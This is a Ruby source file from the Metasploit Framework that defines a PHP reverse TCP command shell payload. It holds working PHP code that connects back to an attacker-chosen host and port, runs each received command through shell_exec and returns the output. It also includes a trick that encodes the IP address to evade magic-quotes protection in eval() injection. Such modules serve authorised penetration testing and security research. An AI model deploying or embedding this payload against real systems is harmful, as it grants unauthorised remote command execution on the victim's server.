##
# $Id:$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'

module Msf
module Payloads
module Singles
module Php

module ReversePhp

	include Msf::Payload::Single

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'PHP Command Shell, Reverse TCP (via php)',
			'Version'       => '$Revision$',
			'Description'   => 'Reverse PHP connect back shell',
			'Author'        => ['diaul <diaul@devilopers.org>',],
			'License'       => BSD_LICENSE,
			'Platform'      => 'php',
			'Arch'          => ARCH_PHP,
			'Handler'       => Msf::Handler::ReverseTcp,
			'Session'       => Msf::Sessions::CommandShell,
			'PayloadType'   => 'cmd',
			'Payload'       =>
				{
					'Offsets' => { },
					'Payload' => ''
				}
			))
	end




	#
	# PHP Reverse Shell
	#
	def php_reverse_shell

	        #
       		# inet_aton to bypass magic quotes protection for eval() vulnerarilities 
        	#

        	if datastore['LHOST']
            		ipaddr = datastore['LHOST'].split(/\./).map{|c| c.to_i}.pack("C*").unpack("N").first
        	end

		shell = <<-END_OF_PHP_CODE
		error_reporting(E_ALL);
		$service_port = #{datastore['LPORT']};

		$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
		$result = socket_connect($socket, #{ipaddr}, $service_port);

		$command = NULL;

		while ($command = socket_read($socket, 2048)) {
        		$output = shell_exec(substr($command, 0, -1));
        		socket_write($socket, $output, strlen($output));
		}

		socket_close($socket);
		END_OF_PHP_CODE
		
		return shell

	end


	#
	# Constructs the payload
	#
	def generate
		return super + php_reverse_shell
	end
	

end

end end end end
